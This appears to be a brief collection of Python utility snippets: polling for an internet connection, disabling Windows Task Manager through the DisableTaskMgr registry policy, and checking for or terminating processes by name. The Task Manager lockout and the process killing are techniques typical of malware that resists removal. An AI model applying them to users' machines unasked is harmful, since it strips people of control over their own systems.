# Wait for internet connection
```python
def wait_internet_connection():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=10)
            return True
        except OSError:
            time.sleep(20)
            pass


print("Waiting for an internet connection...")
wait_internet_connection()
print("Internet connection established.")
```

# Disable/enable task manager
```python
# Administrator access required
import winreg
key_path = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
value_name = 'DisableTaskMgr'
value_data = 1
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
winreg.CloseKey(key)
```

# Check if proccess exists
```python
import psutil
def check_process_exists(process_name):
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'] == process_name:
            return True
    return False
```

# Terminate proccess
```python
import psutil
def terminate_process(process_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            pid = process.info['pid']
            try:
                p = psutil.Process(pid)
                p.terminate()
            except psutil.NoSuchProcess:
                pass
```
